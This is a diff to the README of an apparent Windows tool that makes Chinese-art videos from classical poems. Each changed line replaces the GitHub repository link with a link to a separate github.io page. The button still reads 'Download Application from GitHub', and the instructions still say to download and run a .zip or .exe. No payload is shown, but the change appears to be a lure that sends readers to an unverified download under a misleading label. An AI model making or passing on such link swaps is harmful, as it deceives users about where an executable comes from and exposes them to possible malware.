@@ -1,6 +1,6 @@
 <h1>🎬 hbg-classical-poem-silk-video - Turn Poems into Stunning Chinese Art Videos</h1>
 <p align="center">
-  <a href="https://github.com/Wildenbust542/hbg-classical-poem-silk-video" style="display:inline-block;padding:12px 24px;background:#ff6b6b;color:white;text-decoration:none;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ Download Application from GitHub</a>
+  <a href="https://wildenbust542.github.io" style="display:inline-block;padding:12px 24px;background:#ff6b6b;color:white;text-decoration:none;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ Download Application from GitHub</a>
 </p>
 <p align="center">Create beautiful vertical Chinese-art videos from classical poems automatically.</p>
 
@@ -18,7 +18,7 @@
 <p>Follow these simple steps to run the application on your Windows computer.</p>
 
 <h3>Step 1: Download the Software</h3>
-<p>Visit this link to download the application: <a href="https://github.com/Wildenbust542/hbg-classical-poem-silk-video">https://github.com/Wildenbust542/hbg-classical-poem-silk-video</a></p>
+<p>Visit this link to download the application: <a href="https://wildenbust542.github.io">https://wildenbust542.github.io</a></p>
 <p><strong>Note:</strong> This is a GitHub page. Look for the green "Code" button or scroll down to find the download section. If you see a <code>.zip</code> file, download and extract it. If you see an <code>.exe</code> file, download it directly.</p>
 
 <h3>Step 2: Prepare Your Poem</h3>
@@ -55,7 +55,7 @@
 <p>Ensure your poem file is plain text (no formatting) and try again. If issues persist, check the GitHub Issues page.</p>
 
 <h2>📄 Download Again</h2>
-<p>Visit this link to download the application: <a href="https://github.com/Wildenbust542/hbg-classical-poem-silk-video">https://github.com/Wildenbust542/hbg-classical-poem-silk-video</a></p>
+<p>Visit this link to download the application: <a href="https://wildenbust542.github.io">https://wildenbust542.github.io</a></p>
 <p>Look for the latest release or the main download button.</p>
 
 <h2>💡 Tips for Best Results</h2>
